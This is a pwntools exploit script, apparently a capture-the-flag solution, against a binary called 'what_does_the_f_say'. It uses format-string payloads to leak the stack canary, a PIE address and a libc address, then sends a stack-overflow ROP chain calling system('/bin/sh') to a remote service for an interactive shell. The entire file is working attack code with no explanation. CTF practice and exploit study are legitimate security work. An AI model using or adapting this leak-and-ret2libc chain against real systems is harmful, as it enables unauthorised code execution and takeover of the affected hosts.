from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./what_does_the_f_say")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": ""}


p = remote("ip", 4444)
#p = process("./what_does_the_f_say")
#p = gdb.debug("./what_does_the_f_say", '''break *main
#break *warning+252''')

# Memory Leak: Canary Address
payload = b"%13$llx"

# Memory Leak: __libc_csu_init address for PIE Bypass
payload2 = b"%24$llx"

# Memory Leak: libc memory address
payload3 = b"%3$llx"


# Stack Canary Leak Setup
p.sendline(b"1")
p.recvline()
p.sendline(b"2")
p.recvline()

time.sleep(1)
p.clean()

# Stack Canary Leak
p.sendline(payload)
leak = p.recvuntil(b'\n').strip().decode('utf-8')
canary_leak = int(leak, 16)

print("Canary leak:", hex(canary_leak))

# PIE Bypass - __libc_csu_init leak setup
time.sleep(1)
p.sendline(b"1")
p.recvline()
p.sendline(b"2")
p.recvline()

# __libc_csu_init leak
time.sleep(1)
p.clean()
p.sendline(payload2)

bin_leak = p.recvuntil(b'\n').strip().decode('utf-8')
libc_csu_init_leak = int(bin_leak, 16)
pie_base = libc_csu_init_leak - 6240

time.sleep(1)

# libc_read Leak Setup
p.sendline(b"1")
p.recvline()
p.sendline(b"2")
p.recvline()

# libc leak
time.sleep(1)
p.clean()
p.sendline(payload3)
libc_leak = p.recvuntil(b'\n').strip().decode('utf-8')
libc_leak_address = int(libc_leak, 16)
libc_read = libc_leak_address - 17
libc_system = libc_read - 0xc0ca0
p.clean()

# Spend $ to trigger warning()
for i in range(7):
    p.sendline(b"2")
    p.recvline()
    p.sendline(b"1")
    p.recvline()
    time.sleep(1) # Debugging purposes, race condition errors

# Stack Canary & Overflow Setup
p.sendline(b"1")
p.recvline()
p.sendline(b"2")
p.recvline()
p.sendline(b"Red")
p.recvline()
p.clean()

# binary ROP
binsh = libc_read + 0xa3f7a
pop_rdi = pie_base + 0x18bb
ret = pie_base + 0x1016

print('Canary leak:', hex(canary_leak))
print('libc_csu_init() leak:', hex(libc_csu_init_leak))
print('PIE Base Address:', hex(pie_base))
print('libc read() leak:', hex(libc_read))
print('libc system() leak:', hex(libc_system))
print('libc "/bin/sh" leak:', hex(binsh))

# Exploit
padA = b'A' * 24
padC = b'C' * 8

exploit = padA + p64(canary_leak) + padC + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(libc_system)

# pause() allows the progam to catch up? It works like time.sleep(2) in python2
pause()
p.sendline(exploit)
p.interactive()
